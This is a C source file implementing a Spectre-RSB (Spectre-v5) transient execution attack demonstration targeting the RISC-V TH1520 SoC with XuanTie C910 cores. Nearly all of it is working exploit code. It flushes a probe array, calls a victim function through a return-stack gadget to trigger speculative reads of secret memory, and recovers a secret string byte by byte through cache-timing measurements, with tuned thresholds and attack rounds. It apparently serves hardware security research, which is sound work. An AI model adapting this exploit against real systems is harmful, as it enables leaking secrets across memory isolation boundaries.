#include <stdio.h>
#include <stdint.h>
#include <string.h> // For strlen()
#include <stdlib.h> // For rand() and srand()
#include <time.h> // For time(NULL)
#include "util_riscv.h"
#include "util_shared.h"
#include "cache.h"


/* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
/*
 * 1. Variable and function names are in lower camel case, i.e. camelCase, or sneak case, i.e. sneak_case.
 * 2. (at)input, (at)inout, etc may be used for preprocessors.
 */

/**
 * The following parameters vary with machines and are obtained from experiments,
 * using "control variates method" and "binary/half-interval/logarithmic search/".
 */
//#define TRAIN_TIMES 24 // (Spectre-RSB does not need trainning.) Times to train the predictor. There shall be an ideal value for each machine.
// Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
#define ATTACK_ROUNDS 50 // Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
// For most processors with simple RAS(Return Address Stack), theoretically 1 will be enough for a successful Spectre-RSB attack.
#define CACHE_HIT_THRESHOLD 67 // Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
// Threshold for Spectre-RSB is quite different from others. It is much more sensitive which requires more manual tuning.
// To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.

/* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */


#define DEFAULT_STRING "#Secret_Information!"
#define MAX_STRING_LENGTH_FACTOR 8
/**
 * Arbitrary as long as your machine allows it
 */

#define ARRAY_STRIDE L1_DCACHE_BLOCK_BYTES
/**
 * Reference from Lipp et al, 2018, Meltdown:
 * Based on the value of data in this example, a different part of the cache is accessed when executing the memory access out of order.
 * As data is multiplied by L1_DCACHE_BLOCK_BYTES (found with getconf PAGE_SIZE, typically 4096), data accesses to probe array are scattered over the array
 * with a distance of L1_DCACHE_BLOCK_BYTES Bytes (typically 4 KB, assuming an 1 B data type for probe array, e.g. uint8_t).
 * Thus, there is an injective mapping from the value of data to a memory page, i.e., different values for data never result in an access to the same page.
 * Consequently, if a cache line of a page is cached, we know the value of data.
 * The spreading over pages eliminates false positives due to the prefetcher, as the prefetcher cannot access data across page boundaries.
 * This prevents the hardware prefetcher from loading adjacent memory locations into the cache as well.
 */

/** 
 * Assume the attacker knows following information in advance: 
 * - Hardware specifications
 * - Complete control of an probeArray (contents, size)
 * - The start address of secretString (but no way to directly access contents of secretString)
 * - The character set of secretString and its size (such as extended ASCII which is 0~255, 8bit).
 */

/** 
 * Although there are no direct accesses to secretString, after being "trained" for a certain times,
 * vulnerable processors will "grow accustomed to" legitimate inputs fed deliberately by the attacker, 
 * and mistakenly predict that succeeding illegitimate attempts wll also be true, fetching secretString into cache.
 * The attacker can then exploit the shortened access time (because of cache) and apply cache SCAs methods,
 * to infer characters of secretString one by one, using brutal force (exhausting all 256 possibities of extended ASCII).
 */

#define RESULT_ARRAY_SIZE 256
/**
 * In this example program, all secret characters are in extended ASCII codes (0~255, 8bit).
 * Ofc you may change it for others like Unicode, but that will complicate everything, 
 * and will also introduce REALLY high performance requirements.
 */

#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
/**
 * The size of probeArray can not be smaller than the max element of innerArray.
 * Also the size of innerArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
 * (Basically there is no point in designating these parameters of innerArray separately.)
 *
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient. 
 */

//uint8_t placeHolder[32];
uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE]; // TBD: this placeHolder array can not be omitted for unknown reasons. 

 /* Declare a global variable that prevents the compiler from optimizing out victimFunc(). */
uint8_t anchorVar = 0;

/** Given an attack address, victimFunc reads in the attack array speculatively by bypassing the RSB.
  *
  * Number (but not order) of lines of victimFunc matters in 2 aspects:
  *
  * 1. It determines changes made to "ra" (return address) and "sp" (stack pointer) values in the swStackGadget (software stack gadget) assembly codes.
  * Specific explanations are given in comments of the following codes.
  * Also see the following links for basic knowledge and references:
  * Call stack layout: https://en.wikipedia.org/wiki/Call_stack
  * (As this link has pointed out, while "parameters" and "return address" have shared parts, "locals" are distinct.)
  * Stack-based memory allocation: https://en.wikipedia.org/wiki/Stack-based_memory_allocation
  *
  * 2. It may help extending the execution time ("speculation window"), though you can achieve it using other techiques.
  * (e. g. increasing number of division operations for intentionally delaying purposes in the swStackGadget source code file.) 
  *
  */
  
/**
 * @input secretAddr input to be used to idx the array
 */
void victimFunc(uint64_t secretAddr){


//	This part forms the minimum requirements.
//	Note that they should not be replaced with in-line assembly codes,
//	since function calling is necessary.
	extern void swStackGadget();
	swStackGadget();

//	The simplest and quickest way with least lines.
//	Seems to be too fast that cause confusions inside data cache, though.
//	swStackGadget values for this way: "ld ra, 24(sp)" and "addi sp, sp, 32".
	anchorVar &= probeArray[(*((uint8_t*)secretAddr)) * ARRAY_STRIDE];

//	This one is a slightly modified version.
//	swStackGadget values for this way: "ld ra, 40(sp)" and "addi sp, sp, 48".
//	uint64_t  junkVar = 0;
//	uint8_t* secretIntermediate = (uint8_t*)secretAddr;
//	anchorVar &= probeArray[*(secretIntermediate) * ARRAY_STRIDE];

//	This way is identical to the original one from UCB boom-attacks repositoriy.
//	Link: https://github.com/riscv-boom/boom-attacks/blob/master/src/returnStackBuffer.c
//	swStackGadget values for this way: "ld ra, 56(sp)" and "addi sp, sp, 64".
//	uint64_t  junkVar = 0;
//	uint8_t* secretIntermediate = (uint8_t*)secretAddr;
//	junkVar &= probeArray[*(secretIntermediate) * ARRAY_STRIDE];
//	junkVar = READ_CSR(cycle);
}

// TBD: mix the order in other ways.
#define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
#define MIXER_B 1 // Arbitrary as long as larger than 0.

int main(void){
	
	printf("****** Transient Execution Attack Demonstration ******\n");
	printf("- Type of Attack: Spectre-RSB (a.k.a Spectre-v5)\n");
	printf("- Target Chipset: RISC-V TH1520 SoC (Quad T-Head XuanTie C910)\n");
	
	char* defaultString = DEFAULT_STRING;
	int maxStringLength = strlen(defaultString) * MAX_STRING_LENGTH_FACTOR;
    char* secretString;
	// Allocate memory for the string. 
	// Need to do this in main function because return 1 of subfunction will not terminate the main.
	secretString = malloc(maxStringLength * sizeof(char));
	if (secretString == NULL) {
		printf("Error: Memory allocation failed.\n");
		return 1; // Indicate error
	}
	
	dynamicInputString(defaultString, maxStringLength, secretString);
	
	uint64_t mixed_i;
	register uint64_t start, diff;
	uint64_t dummy;
	
	// Get the highest and second highest hit values in results().
	// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
	// and its corresponding stored array value means cache hits.
	static uint64_t results[RESULT_ARRAY_SIZE];
	uint8_t output[2];
	uint64_t hitArray[2];
	
	char guessString[strlen(secretString)+1];
	/* Fill the guessString with NULL terminators. */
	for (int i = 0; i < sizeof(guessString); i++){
		guessString[i] = '\0';
	}

	/* Write to probeArray so in RAM not copy-on-write zero pages. */
	for (int i = 0; i < sizeof(probeArray); i++){
		probeArray[i] = 1;
	}
	
	printf("------ Start of Attack ------\n");
	printf("MemAddr ~ StrOffset ~ TargetChar <-?-- GuessResult(Char, Dec, Hits)\n"); 

	// Note: strlen() calculates the length of a string up to, but not including, the terminating null \n character.
	// About strlen() function: https://en.cppreference.com/w/cpp/string/byte/strlen
	// Note: sizeof() does not care about the value of a string, so can not be used here.
	// Ref: https://www.geeksforgeeks.org/difference-strlen-sizeof-string-c-reviewed/
	for(uint64_t len = 0; len < (strlen(secretString)); len++){
		
		// Clear results every round.
		for(uint64_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
			results[cIdx] = 0;
		}

		// Run the attack on the same idx for ATTACK_ROUNDS times.
		for(uint64_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
			
			// Make sure array you read from is not in the cache.
//			flushCache((uint64_t)secretString, sizeof(secretString));
			flushCache((uint64_t)probeArray, sizeof(probeArray));

			/* Delay (act as mfence, memory fence) */
			// Set of constant takens to make the BHB be in a all taken state				
			for(volatile int k = 0; k < ARRAY_SIZE_FACTOR; k++){
				asm("");
			}
				
			victimFunc((uint64_t)secretString + len); 
			__asm__ volatile ("ld fp, -16(sp)");

			// Read out probeArray and see the hit secret value.		
			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
				start = READ_CSR(cycle);
				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
				diff = (READ_CSR(cycle) - start);
				
				// Condition: interval of time is smaller than the threshold.
				if ((uint64_t)diff < CACHE_HIT_THRESHOLD){
				results[mixed_i]++; /* Cache hit */
				}
			}
		
		}
		
		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
		/* results[0] of static array results() will always be translated into a NULL control character in ASCII or Unicode, so don't worry. */
		/* ^ bitwise exclusive OR sets a one in each bit position where its operands have different bits, and zero where they are the same.*/
		results[0] ^= dummy;
		topTwoIdx(results, RESULT_ARRAY_SIZE, output, hitArray);
		
		printf("MA[%p] ~ SO(%lu) ~ TC("ANSI_CODE_YELLOW"%c"ANSI_CODE_RESET") <-?-- GR("ANSI_CODE_CYAN"%c"ANSI_CODE_RESET", %d, %lu)\n", (uint8_t*)(secretString+len), len, secretString[len], output[0], output[0], hitArray[0]);
		
		guessString[len]=(char)output[0];

	}

	printf("------ End of Attack ------\n");
	
	printf("------ Summary ------\n");
    printf("Expected: "ANSI_CODE_YELLOW"%s"ANSI_CODE_RESET"\n", secretString);
	printf("Guessed: "ANSI_CODE_CYAN"%s"ANSI_CODE_RESET"\n", guessString);
	printf("****** That Is All for the Demonstration ******\n");
	
	// Free the allocated memory after use.
	free(secretString);

	return 0;
}
